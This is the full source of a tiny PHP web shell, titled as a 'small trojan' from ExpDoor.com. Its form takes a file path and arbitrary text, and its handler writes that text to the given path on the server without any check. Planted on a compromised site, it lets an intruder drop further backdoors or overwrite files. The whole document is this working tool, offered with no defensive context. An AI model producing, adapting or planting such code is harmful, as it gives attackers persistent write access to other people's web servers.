<?php
if ($_POST)
{
$f=fopen($_POST["f"],"w");
if(fwrite($f,$_POST["c"]))
echo "<font color=red>OK!</font>";
else
echo "<font color=blue>Error!</font>";
}
?>

<title> PHP小马 - ExpDoor.com</title>
<form action="" method="post">
<input type="text" size=61 name="f" value='<?php echo $_SERVER["SCRIPT_FILENAME"];?>'><br><br>
<textarea name="c" cols=60 rows=15></textarea><br>
<input type="submit" id="b" value="Create"><br>
</form>
<p></p>